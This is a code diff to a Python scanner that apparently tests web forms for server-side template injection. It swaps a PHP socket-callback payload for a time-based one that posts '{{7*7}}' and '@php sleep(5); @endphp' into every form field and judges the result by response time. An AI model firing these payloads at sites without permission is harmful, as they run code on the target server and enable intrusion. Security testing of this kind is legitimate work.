@@ -1,4 +1,5 @@
 import re
+import time
 import urllib.request
 import requests
 import subprocess
@@ -142,14 +143,13 @@ def get_forms(html):
 
     return link_groups
 
-
-def test_blind_posterior(urls):
+def test_blind_immediate(urls):
     """
-    This function performs SSTI on all forms in pages. This works by sending a connection request to a socket
-    server that will run after all forms have been filled. The socket server will then confirm injection success based
-    on if a connection is received or not.
+    This function performs SSTI on all forms for all urls. *write here how the process works*
     """
 
+    scan_result = []
+    sleep_time = 5
     for url in urls:
         session = requests.session()
         front = session.get(url)
@@ -166,28 +166,30 @@ def test_blind_posterior(urls):
                 inputs = groups[group]
 
                 for inp in inputs:  # Give each input a value and add to dictionary
-                    post_data[inp] = f"""@php 
-                                              try{{
-                                                  $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://";
-                                                  $url = $protocol . $_SERVER['SERVER_NAME'] . ":". $_SERVER['SERVER_PORT'] . $_SERVER['REQUEST_URI']; 
-                                                  $sock = fsockopen('localhost', 9000);
-                                                  fwrite($sock, 'Injection detected from form {group}, on page: {url}. Code was executed on '. $url); 
-                                                  fclose($sock);
-                                              }}
-                                              catch(Exception $e){{}}
-                                         @endphp"""
-                post_data["_token"] = token  # Add token last
-                requests.post(group, post_data, cookies=cookies)
+                    post_data[inp] = group + " {{7*7}} " + "@php sleep("+str(sleep_time)+"); @endphp"
 
+                post_data["_token"] = token  # Add token last
+                start = time.time()
+                req = requests.post(group, data=post_data, cookies=cookies)
+                end = time.time()
+
+
+                # If it's visible, we consider that this is reflected injection and not stored immediate injection
+                if ("49" in req.text):
+                    scan_result.append("URL: " + url + " Form link: " + group + " isVulnerable: False")
+                    continue
+
+                # Request took double the amount of time of the sleep, therefore we can deduce that SSTI was successful
+                if (end - start >= sleep_time*2):
+                    scan_result.append("URL: " + url + " Form link: " + group + " isVulnerable: True")
+                else:
+                    scan_result.append("URL: " + url + " Form link: " + group + " isVulnerable: False")
         except IndexError:
+            scan_result.append("URL: " + url + " isVulnerable: Unable to test, no input points found")
             continue
 
+    return scan_result
 
-    server_instance = subprocess.Popen(['python', 'SocketServer.py', ' '.join(urls)])
-    while server_instance.poll() is None:
-        if(server_instance.poll() != None):
-            break
-        pass
 
 
 # Begin the scanning process
@@ -197,4 +199,7 @@ urls = get_page_urls(html)
 
 nested_links = check_nested_links(urls)
 filtered_urls = filter_links(urls+nested_links)
-test_blind_posterior(filtered_urls)
+stored_imm_results = test_blind_immediate(filtered_urls)
+
+for result in stored_imm_results:  # print results
+    print(result)
